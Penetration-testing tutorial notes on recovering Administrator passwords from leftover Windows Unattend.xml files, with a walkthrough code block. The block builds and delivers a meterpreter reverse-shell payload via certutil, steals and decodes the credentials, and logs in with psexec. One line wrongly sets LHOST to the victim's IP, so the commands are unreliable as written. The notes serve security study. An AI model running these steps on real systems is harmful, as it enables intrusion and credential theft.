# B - Searching for Passwords in Windows Configuration Files

### **Windows Configuration Files**

* Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems.
* This is typically done through the use of the Unattended Windows Setup utility, which is used to automate the mass installation/deployment of Windows on systems.
* This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account's password.
* If the Unattended Windows Setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows target legitimately.

### **Unattended Windows Setup**

* The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
  * C:\Windows\Panther\Unattend.xml
  * C:\Windows\Panther\Autounattended.xml
* As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.



### **Practical Demonstration**

We already have a non-privileged foothold on the target system.

#### Gaining Initial access

```bash
# we generate a meterpreter 64bit payload.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$victim_ip LPORT=1234 -f exe > payload.exe

# we create a python server to transfer the payload to the victim PC.
python -m SimpleHTTPServer 80

# To transfer the file, we use the certutil utility.
certutil -urlcache -f http://$kali_ip/payload.exe payload.exe

# you can close the server.
# now we setup the Metasploit multi/handler listener.
service postgresql start && msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST and LPORT
run

# execute the payload on the target system, and we get a meterpreter session.
sysinfo
search -f Unattend.xml  # trying to find the creds mannually since we know the location.
# or we navigate into the location directly.
cd C:\\
cd Windows
cd Panther
dir  # we have the file there.
download Unattend.xml  # downloads the file to our kali machine.

# we can cat out the content of the file, then look through it. Get the UN and PW.
# we notice the password is encoded in base64.
# copy and paste the PW into a ".txt" file.
nano pass.txt
# lets use the [base64] utility in kali to decode it.
base64 -d pass.txt # we decode the password.

# in some cases, the sys admins might have already changed the password after the unattended installation.
# we use the psexec.py scipt to verify the password is still valid.
# psexec.py <username>@<targetIP> #Try the credentials to see if they're still valid
psexec.py  Administrator@$victim_ip
whoami  # nt authority.
```



